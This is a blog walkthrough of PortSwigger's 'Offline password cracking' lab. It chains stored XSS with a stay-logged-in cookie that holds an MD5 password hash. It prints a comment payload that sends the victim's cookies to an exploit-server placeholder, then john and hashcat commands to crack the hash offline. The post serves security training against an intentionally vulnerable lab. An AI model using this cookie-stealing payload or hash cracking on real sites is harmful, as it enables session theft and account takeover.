---
title: PortSwigger Walkthrough - Offline password cracking
date: 2026-06-28 13:30:00 +0200
categories: [Walkthrough, PortSwigger]
tags: [walkthrough, portswigger, bscp, authentication, cracking]
author: diego
description: Walkthrough of PortSwigger's 'Offline password cracking' lab.
image:
  path: /assets/img/posts/portswigger/portswigger.png
  alt: PortSwigger Web Security Academy
---

> To browse all labs in this series, visit the [full PortSwigger series](/categories/portswigger/).
{: .prompt-info }

> All testing shown in this series is performed against PortSwigger Academy's intentionally vulnerable labs.  
> Do not apply these techniques to systems you do not own or have explicit written permission to test.
{: .prompt-warning }

## What's this?
This lab chains two vulnerabilities. First, stored XSS in the comment section lets us steal a victim's cookies by redirecting their browser to a server we control. Second, the stolen `stay-logged-in` cookie contains an MD5 hash of the user's password, which can be cracked offline with a wordlist.

Neither vulnerability alone is enough to take over the account: the XSS needs the weak cookie to get the password, and the weak cookie needs the XSS to be stolen in the first place. Together, they give us everything. This is a good example of why chained vulnerabilities are often more dangerous than their individual CVSS scores suggest.

## Objective
Steal Carlos's `stay-logged-in` cookie via XSS, crack his password hash, log in as Carlos, and delete his account. Credentials `wiener:peter` are provided.

> [PortSwigger's lab link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
{: .prompt-info }

## Walkthrough
As we already know from the [previous lab](/posts/brute-forcing-stay-logged-in-cookie), the `stay-logged-in` cookie is `base64(username:md5(password))`. If we can steal Carlos's cookie, we can extract and crack his password hash offline.

Navigate to any blog post and scroll to the comment form at the bottom. Submit the following payload as the comment body, replacing the URL with your own exploit server:

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

When Carlos's browser loads that comment, the script runs and sends his cookies to our server as part of the URL. Open the exploit server and check the **Access log**. We will see a request containing the `stay-logged-in` cookie value.

Base64-decode it to get `carlos:hash`. Now we need to crack the MD5 hash.

> Never submit hashes to online cracking services during real engagements. Those platforms store every hash and cleartext pair submitted, indefinitely. Use local tooling.
{: .prompt-danger }

For this lab, I used [crackstation.net](https://crackstation.net/) since it was just a lab and I did not feel like installing hashcat just for this (yeah I know, I know). For anything real, use local tools:

```bash
# Store the hash
echo 'hash_value_here' > hash.txt

# Crack with john
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Or with hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

The cracked password for this lab is `onceuponatime`. Log in as `carlos:onceuponatime`, navigate to account settings, and delete the account. Lab solved.

![Lab solved confirmation](/assets/img/posts/portswigger/auth/21-lab-solved.png)

<br><br>
> Wanna talk? Contact me here!  
> <a href="javascript:void(0);" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" onclick="navigator.clipboard.writeText('diegofdlg@gmail.com');alert('Mail copied to the clipboard!')"><i class="fa-solid fa-envelope"></i></a>
> <a href="https://www.linkedin.com/in/diego-fidalgo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-linkedin"></i></a>
> <a href="https://x.com/0x_ch3ngo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>
> <a href="https://discord.com/users/149616662537043969" style="font-size:1.2rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-discord"></i></a>
{: .prompt-tip }
